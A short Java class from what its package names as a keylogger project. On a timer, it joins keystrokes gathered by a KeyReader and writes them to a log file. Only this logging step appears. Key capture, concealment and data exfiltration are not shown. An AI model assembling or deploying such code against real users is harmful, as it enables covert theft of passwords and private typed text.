package com.mossad.keylogger.timer;

import com.mossad.keylogger.logging.LogRecorder;
import com.mossad.keylogger.reader.KeyReader;
import java.util.List;
import java.util.TimerTask;

public class WriterTask extends TimerTask {

    private KeyReader keyReader;
    private LogRecorder logRecorder;

    public WriterTask(KeyReader keyReader, LogRecorder logRecorder) {
        this.keyReader = keyReader;
        this.logRecorder = logRecorder;
    }

    @Override
    public void run() {
        List<String> keys = keyReader.getCollectedKeys();
        StringBuilder stringBuilder = new StringBuilder();
        keys.forEach(key -> stringBuilder.append(key));
        logRecorder.writeContent(stringBuilder.toString());
    }
}